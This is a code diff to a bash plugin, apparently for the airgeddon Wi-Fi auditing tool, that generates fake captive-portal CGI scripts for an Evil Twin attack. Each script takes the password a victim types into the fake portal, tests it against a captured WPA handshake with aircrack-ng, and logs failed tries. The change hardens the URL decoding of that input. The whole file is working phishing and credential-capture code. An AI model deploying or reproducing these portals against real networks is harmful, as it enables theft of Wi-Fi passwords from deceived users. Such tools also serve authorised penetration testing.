@@ -10,7 +10,7 @@ plugin_author="xpz3"
 #Enable/Disable Plugin 1=Enabled, 0=Disabled
 plugin_enabled=1
 
-plugin_minimum_ag_affected_version="12.02"
+plugin_minimum_ag_affected_version="12.10"
 plugin_maximum_ag_affected_version=""
 
 plugin_distros_supported=("*")
@@ -59,23 +59,42 @@ function customportals_create_updatephpfile() {
 			#!/usr/bin/env bash
 
 			POST_DATA=\$(cat /dev/stdin)
+			password=""
 			if [[ "\${REQUEST_METHOD}" = "POST" ]] && [[ "\${CONTENT_LENGTH}" -gt 0 ]]; then
 				POST_DATA=\$(echo "\${POST_DATA}" | grep -oP '\b(${customportals_possible_password_fields})=\K[^&]*')
-				password=\${POST_DATA//+/ }
-				password=\${password//[*&\/?<>]}
-				password=\$(printf '%b' "\${password//%/\\\x}")
-				password=\${password//[*&\/?<>]}
+				for ((i=0; i < \${#POST_DATA}; i++)); do
+					character=\${POST_DATA:i:1}
+					case "\${character}" in
+						"+")
+							password+=" "
+						;;
+						"%")
+							hexadecimal=\${POST_DATA:i+1:2}
+							if [[ ! "\${hexadecimal}" =~ ^[[:xdigit:]]{2}$ ]] || [[ "\${hexadecimal}" = "00" ]]; then
+								password=""
+								break
+							fi
+							printf -v character "%b" "\\x\${hexadecimal}"
+							password+="\${character}"
+							i=\$((i + 2))
+						;;
+						*)
+							password+="\${character}"
+						;;
+					esac
+				done
+				[[ "\${password}" =~ [[:cntrl:]] ]] && password=""
 			fi
 
 			if [[ "\${#password}" -ge 8 ]] && [[ "\${#password}" -le 63 ]]; then
 				rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
-				echo "\${password}" > "${tmpdir}${webdir}${currentpassfile}"
+				printf "%s\n" "\${password}" > "${tmpdir}${webdir}${currentpassfile}"
 				if aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null; then
 					touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
 					${customportals_success_response}
 					et_successful=1
 				else
-					echo "\${password}" >> "${tmpdir}${webdir}${attemptsfile}"
+					printf "%s\n" "\${password}" >> "${tmpdir}${webdir}${attemptsfile}"
 					${customportals_fail_response}
 					et_successful=0
 				fi
@@ -110,17 +129,36 @@ function customportals_create_checkphpfile() {
 			echo -e '\t</head>'
 			echo -e '\t<body></body></html>'
 			POST_DATA=\$(cat /dev/stdin)
+			password=""
 			if [[ "\${REQUEST_METHOD}" = "POST" ]] && [[ "\${CONTENT_LENGTH}" -gt 0 ]]; then
 				POST_DATA=\$(echo "\${POST_DATA}" | grep -oP '\b(${customportals_possible_password_fields})=\K[^&]*')
-				password=\${POST_DATA//+/ }
-				password=\${password//[*&\/?<>]}
-				password=\$(printf '%b' "\${password//%/\\\x}")
-				password=\${password//[*&\/?<>]}
+				for ((i=0; i < \${#POST_DATA}; i++)); do
+					character=\${POST_DATA:i:1}
+					case "\${character}" in
+						"+")
+							password+=" "
+						;;
+						"%")
+							hexadecimal=\${POST_DATA:i+1:2}
+							if [[ ! "\${hexadecimal}" =~ ^[[:xdigit:]]{2}$ ]] || [[ "\${hexadecimal}" = "00" ]]; then
+								password=""
+								break
+							fi
+							printf -v character "%b" "\\x\${hexadecimal}"
+							password+="\${character}"
+							i=\$((i + 2))
+						;;
+						*)
+							password+="\${character}"
+						;;
+					esac
+				done
+				[[ "\${password}" =~ [[:cntrl:]] ]] && password=""
 			fi
 
 			if [[ "\${#password}" -ge 8 ]] && [[ "\${#password}" -le 63 ]]; then
 				rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
-				echo "\${password}" > "${tmpdir}${webdir}${currentpassfile}"
+				printf "%s\n" "\${password}" > "${tmpdir}${webdir}${currentpassfile}"
 				if aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null; then
 					touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
 					echo '<script type="text/javascript">'
@@ -128,7 +166,7 @@ function customportals_create_checkphpfile() {
 					echo '</script>'
 					et_successful=1
 				else
-					echo "\${password}" >> "${tmpdir}${webdir}${attemptsfile}"
+					printf "%s\n" "\${password}" >> "${tmpdir}${webdir}${attemptsfile}"
 					echo '<script type="text/javascript">'
 					echo -e '\tsetTimeout("redirecterror()", 100);'
 					echo '</script>'
@@ -311,23 +349,42 @@ function customportals_override_set_captive_portal_page() {
 			echo -e '\t\t\t<center><p>'
 
 			POST_DATA=\$(cat /dev/stdin)
+			password=""
 			if [[ "\${REQUEST_METHOD}" = "POST" ]] && [[ "\${CONTENT_LENGTH}" -gt 0 ]]; then
 				POST_DATA=\$(echo "\${POST_DATA}" | grep -oP '\b(${customportals_possible_password_fields})=\K[^&]*')
-				password=\${POST_DATA//+/ }
-				password=\${password//[*&\/?<>]}
-				password=\$(printf '%b' "\${password//%/\\\x}")
-				password=\${password//[*&\/?<>]}
+				for ((i=0; i < \${#POST_DATA}; i++)); do
+					character=\${POST_DATA:i:1}
+					case "\${character}" in
+						"+")
+							password+=" "
+						;;
+						"%")
+							hexadecimal=\${POST_DATA:i+1:2}
+							if [[ ! "\${hexadecimal}" =~ ^[[:xdigit:]]{2}$ ]] || [[ "\${hexadecimal}" = "00" ]]; then
+								password=""
+								break
+							fi
+							printf -v character "%b" "\\x\${hexadecimal}"
+							password+="\${character}"
+							i=\$((i + 2))
+						;;
+						*)
+							password+="\${character}"
+						;;
+					esac
+				done
+				[[ "\${password}" =~ [[:cntrl:]] ]] && password=""
 			fi
 
 			if [[ "\${#password}" -ge 8 ]] && [[ "\${#password}" -le 63 ]]; then
 				rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
-				echo "\${password}" > "${tmpdir}${webdir}${currentpassfile}"
+				printf "%s\n" "\${password}" > "${tmpdir}${webdir}${currentpassfile}"
 				if aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null; then
 					touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
 					echo '${et_misc_texts[${captive_portal_language},18]}'
 					et_successful=1
 				else
-					echo "\${password}" >> "${tmpdir}${webdir}${attemptsfile}"
+					printf "%s\n" "\${password}" >> "${tmpdir}${webdir}${attemptsfile}"
 					echo '${et_misc_texts[${captive_portal_language},17]}'
 					et_successful=0
 				fi
@@ -443,23 +500,43 @@ function customportals_override_set_captive_portal_page() {
 			echo -e '\t\t\t<center><p>'
 
 			POST_DATA=\$(cat /dev/stdin)
+			password=""
 			if [[ "\${REQUEST_METHOD}" = "POST" ]] && [[ "\${CONTENT_LENGTH}" -gt 0 ]]; then
 				POST_DATA=\${POST_DATA#*=}
-				password=\${POST_DATA//+/ }
-				password=\${password//[*&\/?<>]}
-				password=\$(printf '%b' "\${password//%/\\\x}")
-				password=\${password//[*&\/?<>]}
+				POST_DATA=\${POST_DATA%%&*}
+				for ((i=0; i < \${#POST_DATA}; i++)); do
+					character=\${POST_DATA:i:1}
+					case "\${character}" in
+						"+")
+							password+=" "
+						;;
+						"%")
+							hexadecimal=\${POST_DATA:i+1:2}
+							if [[ ! "\${hexadecimal}" =~ ^[[:xdigit:]]{2}$ ]] || [[ "\${hexadecimal}" = "00" ]]; then
+								password=""
+								break
+							fi
+							printf -v character "%b" "\\x\${hexadecimal}"
+							password+="\${character}"
+							i=\$((i + 2))
+						;;
+						*)
+							password+="\${character}"
+						;;
+					esac
+				done
+				[[ "\${password}" =~ [[:cntrl:]] ]] && password=""
 			fi
 
 			if [[ "\${#password}" -ge 8 ]] && [[ "\${#password}" -le 63 ]]; then
 				rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
-				echo "\${password}" > "${tmpdir}${webdir}${currentpassfile}"
+				printf "%s\n" "\${password}" > "${tmpdir}${webdir}${currentpassfile}"
 				if aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null; then
 					touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
 					echo '${et_misc_texts[${captive_portal_language},18]}'
 					et_successful=1
 				else
-					echo "\${password}" >> "${tmpdir}${webdir}${attemptsfile}"
+					printf "%s\n" "\${password}" >> "${tmpdir}${webdir}${attemptsfile}"
 					echo '${et_misc_texts[${captive_portal_language},17]}'
 					et_successful=0
 				fi
